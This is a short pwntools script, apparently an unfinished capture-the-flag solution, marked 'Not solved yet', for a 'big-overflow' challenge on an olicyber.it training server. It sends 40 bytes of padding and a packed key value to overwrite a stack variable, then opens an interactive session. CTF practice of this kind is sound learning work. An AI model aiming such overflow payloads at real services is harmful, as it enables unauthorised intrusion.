# Not solved yet

from pwn import *

r = remote('big-overflow.challs.olicyber.it', 34003)

stout_addr = 0x0000000000004020
key = 95099824

r.recvline()

payload = b'A'*32 #classic input
payload += b'A'*8 #stream
payload += p32(key) #key
r.sendline(payload)

r.recvline()
r.recvuntil(': ')

r.sendline('A')

r.interactive()





